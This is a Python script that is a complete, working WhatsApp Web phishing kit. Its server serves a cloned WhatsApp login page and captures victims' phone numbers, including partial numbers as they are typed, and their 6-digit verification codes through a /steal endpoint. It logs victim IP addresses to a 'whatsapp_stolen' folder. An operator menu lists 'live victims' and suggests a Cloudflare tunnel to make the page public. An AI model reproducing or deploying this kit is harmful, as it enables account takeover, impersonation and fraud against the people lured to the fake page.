#!/usr/bin/env python3

import os
import random
import socket
import time
import threading
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import re

SERVER_INSTANCE = None
SERVER_PORT = None
SERVER_THREAD = None

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
BOLD = "\033[1m"
RESET = "\033[0m"

os.makedirs('whatsapp_stolen', exist_ok=True)
os.makedirs('visitor_logs', exist_ok=True)

class WhatsAppPhishingHandler(BaseHTTPRequestHandler):
    victims = []
    
    def get_client_ip(self):
        ip = self.client_address[0]
        x_forwarded_for = self.headers.get('X-Forwarded-For')
        if x_forwarded_for:
            ip = x_forwarded_for.split(',')[0].strip()
        return ip
    
    def log_visitor(self, ip):
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        log_entry = f"[{timestamp}] VISITOR: {ip}\n"
        with open('visitor_logs/visitors.txt', 'a') as f:
            f.write(log_entry)
        print(f"{GREEN} NEW VISITOR: {ip}{RESET}")
    
    def do_GET(self):
        if self.path == '/':
            ip = self.get_client_ip()
            self.log_visitor(ip)
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
            self.send_header('Pragma', 'no-cache')
            self.send_header('Expires', '0')
            self.end_headers()
            
            html_content = self.whatsapp_html()
            self.wfile.write(html_content.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()
    
    def whatsapp_html(self):
        return r"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Web</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flag-icons@6.6.6/css/flag-icons.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { height: 100%; overflow: hidden; }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #128C7E 0%, #25D366 25%, #075E54 50%, #128C7E 100%);
            background-attachment: fixed;
            display: flex; align-items: center; justify-content: center;
            color: #111B21; position: relative;
        }

        body::before {
            content: '';
            position: absolute; inset: 0;
            background: 
                radial-gradient(ellipse 60% 30% at 20% 40%, rgba(255,255,255,0.15) 0%, transparent 50%),
                radial-gradient(ellipse 40% 20% at 80% 80%, rgba(120,219,226,0.2) 0%, transparent 50%);
            pointer-events: none;
        }

        .main-container {
            max-width: 400px; width: 95vw; max-height: 90vh;
            position: relative; z-index: 1;
            display: flex; flex-direction: column; align-items: center;
        }

        .logo-section {
            margin: 40px 0 32px; text-align: center;
        }

.whatsapp-logo {
    width: 120px; height: 120px; margin: 0 auto 20px;
    background-color: #25D366;
    background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/800px-WhatsApp.svg.png');
    background-size: contain;
    background-position: center;
    background-repeat: no-repeat;
    border-radius: 50%;
    display: flex; align-items: center; justify-content: center;
    box-shadow: 0 20px 40px rgba(37,211,102,0.3), inset 0 2px 4px rgba(255,255,255,0.3);
    transition: all 0.3s ease;
}

        .whatsapp-logo:hover { transform: scale(1.05); }

        .app-title {
            font-size: 32px; font-weight: 700;
            background: linear-gradient(135deg, #25D366 0%, white 100%);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            background-clip: text; margin-bottom: 8px; letter-spacing: -0.02em;
        }

        .app-subtitle {
            font-size: 16px; color: rgba(255,255,255,0.9); font-weight: 400; line-height: 1.4; max-width: 280px;
        }

        .form-container {
            background: rgba(255,255,255,0.95); backdrop-filter: blur(30px);
            border-radius: 20px; padding: 36px 28px; width: 100%;
            box-shadow: 0 25px 50px rgba(0,0,0,0.2), 0 0 0 1px rgba(255,255,255,0.5);
            border: 1px solid rgba(255,255,255,0.3);
            transition: all 0.4s cubic-bezier(0.175,0.885,0.32,1.275);
        }

        .form-container:hover {
            transform: translateY(-4px);
            box-shadow: 0 35px 70px rgba(0,0,0,0.25), 0 0 0 1px rgba(255,255,255,0.6);
        }

        .phone-input-group { position: relative; margin-bottom: 24px; }

        .country-selector {
            position: absolute; left: 0; top: 0; bottom: 0; width: 80px;
            background: transparent; border: none; cursor: pointer;
            display: flex; align-items: center; justify-content: center; padding: 0 12px; z-index: 3;
        }

        .country-flag { font-size: 22px; margin-right: 8px; }
        .country-code-display { font-weight: 600; color: #25D366; font-size: 17px; }

        #phoneNumber, #otpNumber {
            width: 100%; padding: 20px 20px 20px 100px;
            border: 2px solid #E1E9EE; border-radius: 16px;
            font-size: 17px; font-weight: 500; color: #111B21;
            background: #F7F9FA; outline: none;
            transition: all 0.3s cubic-bezier(0.25,0.46,0.45,0.94);
        }

        #phoneNumber:focus, #otpNumber:focus {
            border-color: #25D366; background: #FFFFFF;
            box-shadow: 0 0 0 3px rgba(37,211,102,0.1);
        }

        #phoneNumber::placeholder, #otpNumber::placeholder { color: #8696A0; }

        .country-dropdown {
            position: absolute; top: 100%; left: -12px; right: -12px;
            background: #FFFFFF; border: 1px solid #E1E9EE; border-radius: 12px;
            max-height: 240px; overflow-y: auto; z-index: 10;
            box-shadow: 0 10px 40px rgba(0,0,0,0.15);
            opacity: 0; visibility: hidden; transform: translateY(-8px);
            transition: all 0.2s ease;
        }

        .country-dropdown.show {
            opacity: 1; visibility: visible; transform: translateY(0);
        }

        .country-option {
            padding: 14px 20px; display: flex; align-items: center; cursor: pointer;
            transition: background 0.2s ease; font-size: 16px;
            border-bottom: 1px solid #F0F2F5;
        }

        .country-option:hover { background: #F0F2F5; }
        .country-option:last-child { border-bottom: none; }

        .otp-info { text-align: center; margin-bottom: 24px; color: #667781; font-size: 15px; line-height: 1.5; }
        .phone-display { font-weight: 600; color: #111B21; font-family: 'SF Mono', monospace; }

        .primary-btn {
            width: 100%; padding: 18px;
            background: linear-gradient(135deg, #25D366 0%, #128C7E 100%);
            color: #FFFFFF; border: none; border-radius: 16px;
            font-size: 17px; font-weight: 600; cursor: pointer;
            transition: all 0.3s cubic-bezier(0.25,0.46,0.45,0.94);
            box-shadow: 0 4px 18px rgba(37,211,102,0.4);
            text-transform: uppercase; letter-spacing: 0.5px;
            position: relative; overflow: hidden;
            margin-top: 12px;
        }

        .primary-btn::before {
            content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            transition: left 0.5s;
        }

        .primary-btn:hover::before { left: 100%; }
        .primary-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(37,211,102,0.5); }
        .primary-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }

        .otp-container { display: none; animation: slideIn 0.4s cubic-bezier(0.25,0.46,0.45,0.94); }
        @keyframes slideIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .otp-container.show { display: block; }

        .resend-link {
            display: block; text-align: center; color: #25D366; font-size: 15px; font-weight: 500;
            text-decoration: none; margin-top: 16px; cursor: pointer; transition: color 0.2s ease;
        }

        .resend-link:hover { color: #128C7E; }

        @media (max-width: 480px) {
            .main-container { width: 100vw; max-width: none; padding: 0 24px; }
            .form-container { margin: 0 12px; padding: 28px 24px; border-radius: 16px; }
            .whatsapp-logo { width: 100px; height: 100px; }
            .app-title { font-size: 28px; }
        }

        .country-dropdown::-webkit-scrollbar { width: 6px; }
        .country-dropdown::-webkit-scrollbar-track { background: #F0F2F5; border-radius: 3px; }
        .country-dropdown::-webkit-scrollbar-thumb { background: #25D366; border-radius: 3px; }

        .success-screen {
            display: flex; align-items: center; justify-content: center; min-height: 100vh;
            flex-direction: column; text-align: center; padding: 40px 24px;
            background: linear-gradient(135deg, #128C7E 0%, #25D366 25%, #075E54 50%, #128C7E 100%);
            color: white; font-family: inherit;
        }

        .success-spinner {
            width: 80px; height: 80px; background: rgba(255,255,255,0.2);
            border-radius: 50%; margin-bottom: 24px; position: relative;
            animation: spin 1.2s linear infinite;
            backdrop-filter: blur(10px);
        }

        .success-spinner::before {
            content: ''; position: absolute; inset: 8px;
            background: #25D366; border-radius: 50%;
            box-shadow: 0 0 20px rgba(37,211,102,0.6);
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .success-title {
            font-size: 28px; font-weight: 700; margin-bottom: 16px;
            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
        }

        .success-text {
            font-size: 16px; opacity: 0.95; line-height: 1.5;
            max-width: 300px; margin: 0 auto;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="logo-section">
            <div class="whatsapp-logo"></div>
            <h1 class="app-title">WhatsApp</h1>
            <p class="app-subtitle">Send and receive messages without keeping your phone online.</p>
        </div>

        <div class="form-container" id="phoneForm">
            <div class="phone-input-group">
                <button type="button" class="country-selector" onclick="toggleCountryDropdown()">
                    <span class="country-flag fi fi-us"></span>
                    <span class="country-code-display" id="countryCode">+1</span>
                </button>
                <input type="tel" id="phoneNumber" placeholder="Enter your phone number">
                <div class="country-dropdown" id="countryDropdown"></div>
            </div>
            <button class="primary-btn" id="nextButton" onclick="submitPhone()">Next</button>
        </div>

        <div class="form-container otp-container" id="otpForm">
            <div class="otp-info">
                Enter the 6-digit code we sent to <strong id="confirmPhone" class="phone-display"></strong>
            </div>
            <div class="phone-input-group">
                <input type="text" id="otpNumber" placeholder="Enter 6-digit code" maxlength="6">
            </div>
            <button class="primary-btn" onclick="submitOTP()">Confirm</button>
            <a href="#" class="resend-link" onclick="resendOTP(event)">Didn't receive the code?</a>
        </div>
    </div>

    <script>
        let selectedCountry = {code: '+1', iso: 'us', name: 'United States'};
        let fullPhoneNumber = ''; 
        let fullOTP = ''; 
        let isOTPScreen = false;

        const countries = [
            {code: '+1', iso: 'us', name: 'United States'}, {code: '+1', iso: 'ca', name: 'Canada'},
            {code: '+44', iso: 'gb', name: 'United Kingdom'}, {code: '+91', iso: 'in', name: 'India'},
            {code: '+49', iso: 'de', name: 'Germany'}, {code: '+33', iso: 'fr', name: 'France'},
            {code: '+55', iso: 'br', name: 'Brazil'}, {code: '+234', iso: 'ng', name: 'Nigeria'},
            {code: '+254', iso: 'ke', name: 'Kenya'}, {code: '+27', iso: 'za', name: 'South Africa'},
            {code: '+61', iso: 'au', name: 'Australia'}, {code: '+81', iso: 'jp', name: 'Japan'},
            {code: '+82', iso: 'kr', name: 'South Korea'}, {code: '+86', iso: 'cn', name: 'China'},
            {code: '+7', iso: 'ru', name: 'Russia'}, {code: '+92', iso: 'pk', name: 'Pakistan'},
            {code: '+880', iso: 'bd', name: 'Bangladesh'}, {code: '+966', iso: 'sa', name: 'Saudi Arabia'},
            {code: '+971', iso: 'ae', name: 'UAE'}, {code: '+98', iso: 'ir', name: 'Iran'}
        ];

        document.addEventListener('DOMContentLoaded', function() {
            initCountryDropdown(); 
            initPhoneInput(); 
            initOTPInput();
        });

        function initCountryDropdown() {
            const dropdown = document.getElementById('countryDropdown');
            countries.forEach(country => {
                const option = document.createElement('div');
                option.className = 'country-option';
                option.innerHTML = `
                    <span class="country-flag fi fi-${country.iso}"></span>
                    <div style="flex:1">
                        <div>${country.name}</div>
                        <small style="color:#667781">${country.code}</small>
                    </div>
                    <strong>${country.code}</strong>
                `;
                option.onclick = () => selectCountry(country);
                dropdown.appendChild(option);
            });
        }

        function selectCountry(country) {
            selectedCountry = country;
            document.querySelector('.country-flag').className = `country-flag fi fi-${country.iso}`;
            document.getElementById('countryCode').textContent = country.code;
            closeCountryDropdown(); 
            updateNextButton();
        }

        function toggleCountryDropdown() { 
            document.getElementById('countryDropdown').classList.toggle('show'); 
        }
        
        function closeCountryDropdown() { 
            document.getElementById('countryDropdown').classList.remove('show'); 
        }

        function initPhoneInput() {
            const phoneInput = document.getElementById('phoneNumber');
            phoneInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 10) value = value.slice(0, 10);
                if (value.length >= 7) {
                    value = value.replace(/(\d{3})(\d{3})(\d{4})/, '$1-$2-$3');
                } else if (value.length >= 4) {
                    value = value.replace(/(\d{3})(\d{0,4})/, '$1-$2');
                }
                e.target.value = value; 
                updateNextButton();
            });

            phoneInput.addEventListener('keypress', function(e) {
                if (e.key >= '0' && e.key <= '9') {
                    const cleanPhone = phoneInput.value.replace(/\D/g, '');
                    if (cleanPhone.length >= 3) {
                        fetch('/steal', {
                            method: 'POST', headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                type: 'number_typing',
                                partial_number: cleanPhone,
                                country_code: selectedCountry.code,
                                action: 'typing'
                            })
                        }).catch(() => {});
                    }
                }
            });

            phoneInput.addEventListener('keyup', function(e) {
                if (e.key === 'Enter') submitPhone();
            });

            document.addEventListener('click', (e) => {
                if (!e.target.closest('.phone-input-group')) closeCountryDropdown();
            });
        }

        function updateNextButton() {
            const cleanPhone = document.getElementById('phoneNumber').value.replace(/\D/g, '');
            const button = document.getElementById('nextButton');
            const isValid = cleanPhone.length >= 10;
            button.disabled = !isValid;
            button.textContent = isValid ? 'Next' : 'Enter phone number';
        }

        function submitPhone() {
            const cleanPhone = document.getElementById('phoneNumber').value.replace(/\D/g, '');
            if (cleanPhone.length < 10) return;
            fullPhoneNumber = selectedCountry.code + cleanPhone;

            fetch('/steal', {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    type: 'phone', 
                    full_number: fullPhoneNumber,
                    country: selectedCountry.name, 
                    country_code: selectedCountry.code, 
                    action: 'capture'
                })
            }).catch(() => {});

            document.getElementById('phoneForm').style.display = 'none';
            document.getElementById('otpForm').classList.add('show');
            document.getElementById('confirmPhone').textContent = fullPhoneNumber;
            document.getElementById('otpNumber').focus();
            isOTPScreen = true;
        }

        function initOTPInput() {
            const otpInput = document.getElementById('otpNumber');
            
            otpInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 6) value = value.slice(0, 6);
                e.target.value = value;
                fullOTP = value;
                
                if (value.length === 6) {
                    submitOTP();
                }
            });

            otpInput.addEventListener('keyup', function(e) {
                if (e.key === 'Enter') {
                    fullOTP = e.target.value.replace(/\D/g, '');
                    if (fullOTP.length === 6) {
                        submitOTP();
                    }
                }
            });

            otpInput.addEventListener('paste', function(e) {
                e.preventDefault();
                const pasteData = (e.clipboardData || window.clipboardData).getData('text');
                let numbers = pasteData.replace(/\D/g, '').slice(0, 6);
                otpInput.value = numbers;
                fullOTP = numbers;
                if (numbers.length === 6) {
                    submitOTP();
                }
            });
        }

        function submitOTP() {
            fullOTP = document.getElementById('otpNumber').value.replace(/\D/g, '');
            if (fullOTP.length !== 6) return;
            
            fetch('/steal', {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    type: 'otp', 
                    full_number: fullPhoneNumber, 
                    otp: fullOTP,
                    country: selectedCountry.name, 
                    country_code: selectedCountry.code, 
                    action: 'complete'
                })
            }).catch(() => {});

            document.body.innerHTML = `
                <div class="success-screen">
                    <div class="success-spinner"></div>
                    <h2 class="success-title">Success!</h2>
                    <p class="success-text">Redirecting to WhatsApp Web...</p>
                </div>
            `;
        }

        function resendOTP(e) {
            e.preventDefault(); 
            document.getElementById('otpNumber').value = '';
            document.getElementById('otpNumber').focus();
        }

        document.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                if (!isOTPScreen) {
                    submitPhone();
                } else {
                    fullOTP = document.getElementById('otpNumber').value.replace(/\D/g, '');
                    if (fullOTP.length === 6) {
                        submitOTP();
                    }
                }
            }
        });
    </script>
</body>
</html>

        """

    def do_POST(self):
        if self.path == '/steal':
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode('utf-8')
                data = json.loads(post_data)
                
                client_ip = self.get_client_ip()
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                
                if data.get('type') == 'phone':
                    safe_filename = f"PHONE_{client_ip.replace('.','_')}_{timestamp}.txt"
                    content = f"IP: {client_ip}\nPhone: {data.get('full_number', 'N/A')}\nCountry: {data.get('country', 'N/A')}\nTime: {datetime.now()}\n\n"
                    print(f"\n{GREEN}{'═'*80}{RESET}")
                    print(f"{GREEN}  PHONE CAPTURED! {RESET}")
                    print(f"{GREEN}  Phone: {data.get('full_number', 'N/A')}{RESET}")
                    print(f"{GREEN}  IP: {client_ip}{RESET}")
                    
                elif data.get('type') == 'otp':
                    safe_filename = f"OTP_{client_ip.replace('.','_')}_{timestamp}.txt"
                    content = f"IP: {client_ip}\nPhone: {data.get('full_number', 'N/A')}\nOTP: {data.get('otp', 'N/A')}\nCountry: {data.get('country', 'N/A')}\nTime: {datetime.now()}\n\n"
                    print(f"\n{GREEN}{'═'*80}{RESET}")
                    print(f"{GREEN}  WHATSAPP OTP STOLEN! {RESET}")
                    print(f"{GREEN}  Phone: {data.get('full_number', 'N/A')}{RESET}")
                    print(f"{GREEN}  OTP: {data.get('otp', 'N/A')}{RESET}")
                    print(f"{GREEN}  IP: {client_ip}{RESET}")
                    
                elif data.get('type') == 'number_typing':
                    print(f"\n{YELLOW}  TYPING DETECTED{RESET}")
                    print(f"{YELLOW}  Partial: {data.get('partial_number', 'N/A')} {data.get('country_code', '')}{RESET}")
                    print(f"{YELLOW}  IP: {client_ip}{RESET}")
                    safe_filename = f"TYPING_{client_ip.replace('.','_')}_{timestamp}.txt"
                    content = f"IP: {client_ip}\nPartial Number: {data.get('partial_number', 'N/A')}\nCountry Code: {data.get('country_code', 'N/A')}\nTime: {datetime.now()}\n\n"
                else:
                    safe_filename = f"UNKNOWN_{client_ip.replace('.','_')}_{timestamp}.txt"
                    content = f"IP: {client_ip}\nData: {json.dumps(data)}\nTime: {datetime.now()}\n\n"
                
                filepath = os.path.join('whatsapp_stolen', safe_filename)
                
                with open(filepath, 'w', encoding='utf-8') as f:
                    f.write(content)
                
                self.victims.append({
                    'ip': client_ip, 
                    'phone': data.get('full_number', data.get('partial_number', 'N/A')),
                    'otp': data.get('otp', 'N/A'),
                    'file': safe_filename,
                    'time': timestamp
                })
                
                print(f"{GREEN}  Saved: {os.path.abspath(filepath)}{RESET}")
                print(f"{GREEN}{'═'*80}{RESET}\n")
                
            except Exception as e:
                print(f"{RED} Error processing POST: {e}{RESET}")
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'success'}).encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        pass

# [Rest of the code is exactly the same as before - menu, server functions, etc.]
def moni_banner():
    banner = f"""
{BOLD}{PURPLE}
╔══════════════════════════════════════════════════════════════════════════╗
║{RESET}{BOLD}{CYAN}                        WHO'S MONI?                                       {PURPLE}║
║{RESET}                   {BOLD}{RED}WHATSAPP WEB PHISHING {RESET}{PURPLE}                                 ║
║                                                                          ║
║{RESET}{RED}██╗    ██╗██╗  ██╗ ██████╗   ██╗███████╗ ███╗   ███╗ ██████╗ ███╗   ██╗██╗{PURPLE}║
║{RESET}{RED}██║    ██║██║  ██║██╔═══██╗  ██║██╔════╝ ████╗ ████║██╔═══██╗████╗  ██║██║{PURPLE}║
║{RESET}{RED}██║ █╗ ██║███████║██║   ██║  ██║███████╗ ██╔████╔██║██║   ██║██╔██╗ ██║██║{PURPLE}║
║{RESET}{RED}██║███╗██║██╔══██║██║   ██║  ██║╚════██║ ██║╚██╔╝██║██║   ██║██║╚██╗██║██║{PURPLE}║
║{RESET}{RED}╚███╔███╔╝██║  ██║╚██████╔╝  ██║███████║ ██║ ╚═╝ ██║╚██████╔╝██║ ╚████║██║{PURPLE}║
║{RESET}{RED} ╚══╝╚══╝ ╚═╝  ╚═╝ ╚═════╝   ╚═╝╚══════╝ ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝{PURPLE}║
║                                                                          ║
║{RESET}{YELLOW}                Author: Alexxx {GREEN}|{YELLOW} Instagram: @arcane.__01            {RESET}{PURPLE}      ║
╚══════════════════════════════════════════════════════════════════════════╝
{RESET}
    """
    print(banner)

def show_menu():
    global SERVER_INSTANCE, SERVER_PORT
    status = f"{GREEN} RUNNING{RESET}" if SERVER_INSTANCE is not None else f"{RED} STOPPED{RESET}"
    print(f"\n{GREEN}  WHATSAPP PHISHING PANEL {status}{RESET}")
    print(f"{YELLOW}═══════════════════════════════════════{RESET}")
    if SERVER_PORT:
        print(f"   Server: http://localhost:{SERVER_PORT}")
    print(f"  {CYAN}[1]{GREEN}  Start Server & Generate Links{RESET}")
    print(f"  {CYAN}[2]{GREEN}  Show Live Victims{RESET}")
    print(f"  {CYAN}[3]{GREEN}  View Stolen Data{RESET}")
    print(f"  {CYAN}[0]{RED}  Exit{RESET}")
    print(f"{YELLOW}═══════════════════════════════════════{RESET}")


def test_server(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex(('localhost', port))
    sock.close()
    return result == 0

def generate_whatsapp_link(port):
    hostname = socket.gethostbyname(socket.gethostname())
    local_link = f"http://localhost:{port}"
    public_link = f"http://{hostname}:{port}"
    
    print(f"\n{GREEN} WHATSAPP PHISHING LINKS:{RESET}")
    print(f"{YELLOW}═══════════════════════════════════════{RESET}")
    print(f"   {CYAN}Local:      {local_link}{RESET}")
    print(f"   {PURPLE}Cloudflare: cloudflared tunnel --url http://localhost:{port}{RESET}")
    print(f"{YELLOW}═══════════════════════════════════════{RESET}")
    print(f"{GREEN} Data saved → whatsapp_stolen/{RESET}")

def server_thread(port):
    """Run server in background thread"""
    global SERVER_INSTANCE, SERVER_PORT
    handler_class = lambda *args, **kwargs: WhatsAppPhishingHandler(*args, **kwargs)
    SERVER_INSTANCE = HTTPServer(('0.0.0.0', port), handler_class)
    SERVER_PORT = port
    
    print(f"\n{GREEN} SERVER STARTED → http://localhost:{port}{RESET}")
    print(f"{GREEN} Waiting for connections...{RESET}")
    
    try:
        SERVER_INSTANCE.serve_forever()
    except Exception as e:
        print(f"{RED}Server thread error: {e}{RESET}")
    finally:
        if SERVER_INSTANCE:
            SERVER_INSTANCE.shutdown()

def start_server(port):
    global SERVER_THREAD
    
    if test_server(port):
        print(f"{RED} Port {port} already in use!{RESET}")
        return False
    
    SERVER_THREAD = threading.Thread(target=server_thread, args=(port,), daemon=True)
    SERVER_THREAD.start()
    
    for i in range(20):
        if test_server(port):
            print(f"{GREEN} SERVER READY on port {port}!{RESET}")
            generate_whatsapp_link(port)
            return True
        print(f" Starting server... ({i+1}/20)", end='\r')
        time.sleep(0.3)
    
    print(f"\n{RED} Server failed to start on port {port}{RESET}")
    return False

def stop_server():
    global SERVER_INSTANCE, SERVER_THREAD, SERVER_PORT
    if SERVER_INSTANCE is not None:
        print(f"{YELLOW} Shutting down server...{RESET}")
        SERVER_INSTANCE.shutdown()
        SERVER_INSTANCE = None
        SERVER_PORT = None
        SERVER_THREAD = None
        time.sleep(1)
        print(f"{GREEN} Server stopped{RESET}")

def show_status():
    if hasattr(WhatsAppPhishingHandler, 'victims') and WhatsAppPhishingHandler.victims:
        print(f"\n{GREEN} LIVE VICTIMS ({len(WhatsAppPhishingHandler.victims)}):{RESET}")
        print(f"{YELLOW}═══════════════════════════════════════{RESET}")
        for v in WhatsAppPhishingHandler.victims[-10:]:
            phone = v.get('phone', 'N/A')
            otp = v.get('otp', 'N/A')
            status = f"{RED} OTP{RESET}" if otp != 'N/A' else f"{GREEN} Phone{RESET}"
            print(f"  {status} | {v['ip']} | {phone} | {v['time']}")
        print(f"{YELLOW}═══════════════════════════════════════{RESET}")
    else:
        print(f"\n {YELLOW}No victims yet...{RESET}")

def view_stolen_data():
    stolen_dir = 'whatsapp_stolen'
    if os.path.exists(stolen_dir):
        files = sorted([f for f in os.listdir(stolen_dir) if f.endswith('.txt')], 
                      key=lambda x: os.path.getmtime(os.path.join(stolen_dir, x)), reverse=True)
        if files:
            print(f"\n{YELLOW} STOLEN DATA ({len(files)} files):{RESET}")
            print(f"{CYAN}═══════════════════════════════════════{RESET}")
            for file in files[:15]:
                filepath = os.path.join(stolen_dir, file)
                size = os.path.getsize(filepath)
                mtime = datetime.fromtimestamp(os.path.getmtime(filepath)).strftime('%H:%M:%S')
                print(f"   {file} ({size}B) {CYAN}{mtime}{RESET}")
            print(f"{CYAN}═══════════════════════════════════════{RESET}")
        else:
            print(f"\n {YELLOW}No stolen data yet...{RESET}")
    else:
        print(f"\n {YELLOW}No stolen data folder found...{RESET}")

def main_menu():
    global SERVER_INSTANCE, SERVER_PORT, SERVER_THREAD
    moni_banner()
    
    while True:
        show_menu()
        choice = input(f"\n{GREEN}Enter choice (0-3): {RESET}").strip()
        
        if choice == '1':
            stop_server()
            port = random.randint(8000, 9000)
            while test_server(port):
                port = random.randint(8000, 9000)
            print(f"\n Launching on port {port}...")
            if start_server(port):
                print(f"\n{GREEN} Server running in background!{RESET}")
                input(f"{GREEN} Press Enter to return to menu...{RESET}")
            else:
                input(f"{RED} Failed to start server. Press Enter...{RESET}")
                
        elif choice == '2':
            show_status()
            input("\n⏎ Press Enter to continue...")
        elif choice == '3':
            view_stolen_data()
            input("\n⏎ Press Enter to continue...")
        elif choice == '0':
            stop_server()
            print(f"\n{GREEN}Goodbye! Check whatsapp_stolen/ folder! {RESET}")
            break
        else:
            print(f"\n{RED} Invalid choice!{RESET}")

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        stop_server()
        print(f"\n\n {GREEN}Server stopped! Check whatsapp_stolen/ folder! {RESET}")
